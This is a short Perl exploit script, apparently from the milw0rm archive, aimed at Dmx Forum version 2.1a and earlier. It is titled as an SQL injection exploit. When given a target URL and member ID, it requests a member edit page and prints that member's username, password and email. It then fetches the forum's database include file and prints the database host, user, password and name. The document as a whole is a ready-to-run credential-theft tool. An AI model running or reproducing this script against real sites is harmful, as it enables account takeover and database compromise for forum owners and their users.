@@ -1,0 +1,49 @@
+#!/usr/bin/perl
+#
+# by DarkFig -- www.acid-root.new.fr
+#
+use LWP::Simple;
+
+if ( !$ARGV[1] ) {
+header();
+print "\n| Usage: <url> <member_id> ----------------|";
+print "\n+------------------------------------------+";
+print "\n| Example: http://localhost/dmx/ 1   ------|";
+end();
+}
+
+sub header {
+print "\n+------------------------------------------+";
+print "\n| Dmx Forum <= v2.1a SQL Injection Exploit |";
+print "\n+------------------------------------------+";
+}
+
+sub end {
+print "\n+------------------------------------------+\n";
+exit;
+}
+
+$err0 = "\n[-]Can't connect to the host !";
+
+header();
+$url = "$ARGV[0]"."pops/edit.php?membre="."$ARGV[1]";
+$req = get($url) or print "$err0";
+
+if( $req =~ /input name="pseudo" type="text" id="pseudo" value="(.*?)"/ ){
+print "\n [+]Username: $1";
+$req =~ /input name="pwd" type="password" id="pwd" value="(.*?)"/ , print "\n [+]Password: $1";
+$req =~ /input name="email" type="text" id="email" value="(.*?)"/ , print "\n [+]Email: $1";} else {print "\n[-]Part 1 failed !";}
+
+
+$url2 = "$ARGV[0]"."_includes/bd.inc";
+$req2 = get($url2) or print "$err0";
+if($req2 =~ /host = "(.*?)";/)
+{print "\n[+]DBHOST: $1";
+$req2 =~ /user = "(.*?)";/;print "\n[+]DBUSER: $1";
+$req2 =~ /pass = "(.*?)";/;print "\n[+]DBPASS: $1";
+$req2 =~ /bdd = "(.*?)";/;print "\n[+]DBNAME: $1";
+} else {print "\n[-]Part 2 failed !";}
+
+end();
+
+# milw0rm.com [2006-06-05]
